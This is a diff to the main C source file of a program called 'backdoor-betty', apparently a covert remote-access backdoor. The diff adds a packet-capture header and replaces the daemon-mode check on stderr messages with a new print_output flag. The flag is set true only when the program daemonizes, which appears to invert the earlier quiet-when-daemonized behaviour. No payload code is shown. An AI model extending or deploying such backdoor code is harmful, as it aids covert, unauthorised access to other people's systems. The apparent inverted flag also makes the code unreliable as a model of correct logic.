@@ -18,13 +18,12 @@
 
 #include "backdoor-betty.h"
 #include "utils.h"
+#include "pkt_cap.h"
 
 /*-----------------------------------------------------------------------------
  * FUNCTION:    main 
  * 
  * DATE:        June 4, 2010
- * 
- * REVISIONS:   
  * 
  * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
  * 
@@ -83,8 +82,6 @@ int main(int argc, char *argv[])
  * 
  * DATE:        May 17, 2010
  * 
- * REVISIONS:   
- * 
  * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
  * 
  * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
@@ -112,8 +109,6 @@ void print_settings(char *command)
  * FUNCTION:    print_usage
  * 
  * DATE:        May 18, 2010
- * 
- * REVISIONS:   
  * 
  * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
  * 
@@ -152,8 +147,6 @@ void print_usage(char *command, int err)
  * 
  * DATE:        May 17, 2010
  * 
- * REVISIONS:   
- * 
  * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
  * 
  * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
@@ -182,6 +175,7 @@ int parse_options(int argc, char *argv[])
 	/* set defaults */
 	svr_vars.daemonize = FALSE;
 	svr_vars.client_ip = CLIENT_IP;
+	print_output = FALSE;
 
 	/* parse options */
 	while (TRUE) {
@@ -198,6 +192,7 @@ int parse_options(int argc, char *argv[])
 
 			case 'd':
 				svr_vars.daemonize = TRUE;
+				print_output = TRUE;
 				break;
 
 			case 'c':
@@ -222,19 +217,19 @@ void signal_handler(int sig)
 {
 	switch(sig) {
 		case SIGTERM:
-			if (!svr_vars.daemonize)
+			if (print_output)
 				fprintf(stderr, "Received SIGTERM, terminating.\n");
 			exit_clean();
 		case SIGQUIT:
-			if (!svr_vars.daemonize)
+			if (print_output)
 				fprintf(stderr, "Received SIGQUIT, terminating.\n");
 			exit_clean();
 		case SIGKILL:
-			if (!svr_vars.daemonize)
+			if (print_output)
 				fprintf(stderr, "Received SIGKILL, terminating.\n");
 			exit_clean();
 		case SIGINT:
-			if (!svr_vars.daemonize)
+			if (print_output)
 				fprintf(stderr, "\nReceived SIGINT, terminating.\n");
 			exit_clean();
 		default:
@@ -245,7 +240,7 @@ void signal_handler(int sig)
 void exit_clean()
 {
 	/* close sockets etc... */
-	if (!svr_vars.daemonize)
+	if (print_output)
 		fprintf(stderr, "Exited cleanly.\n");
 	exit(ERROR_NONE);
 }
